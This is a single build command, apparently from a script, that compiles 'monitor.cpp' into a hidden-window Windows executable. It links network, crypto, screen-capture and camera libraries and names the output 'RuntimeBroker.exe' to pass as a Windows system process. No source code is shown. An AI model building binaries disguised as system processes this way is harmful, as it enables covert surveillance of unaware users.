...
g++ -static -Os -s -mwindows -D NETPEN_VERSION=$buildVersion monitor.cpp version.res -lwinhttp -lcrypt32 -lgdiplus -lole32 -loleaut32 -lstrmiids -o RuntimeBroker.exe
